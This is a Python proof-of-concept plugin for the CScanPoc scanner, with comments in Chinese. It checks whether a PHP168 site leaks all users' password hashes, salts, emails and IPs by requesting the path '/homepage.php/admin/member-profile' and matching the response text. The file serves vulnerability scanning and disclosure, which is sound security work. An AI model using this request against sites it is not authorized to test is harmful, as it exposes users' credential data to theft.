# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHP168_0003'  # 平台漏洞编号，留空
    name = 'PHP168 用户模块信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2013-06-21'  # 漏洞公布时间
    desc = '''
        PHP168整站是PHP的建站系统，代码全部开源，是国内知名的开源软件提供商；提供核心+模块+插件的模式；任何应用均可在线体验。
        国微PHP168中出现了一处神奇的array，可致全站用户数据泄露。泄露的内容包括全站用户的密码密文、邮箱、密码salt、IP等敏感信息。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/753/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHP168'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ca5c09a9-d099-4000-9645-790c3c012508'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # __Refer___ = http://www.wooyun.org/bugs/wooyun-2010-026345
            payload = '/homepage.php/admin/member-profile'
            verify_url = self.target + payload
            #code, head, body, errcode, final_url = curl.curl2(target)
            r = requests.get(verify_url)

            if r.status_code == 200 and '[username]' in r.text and '[password]' in r.text and 'Array' in r.text:
                # security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
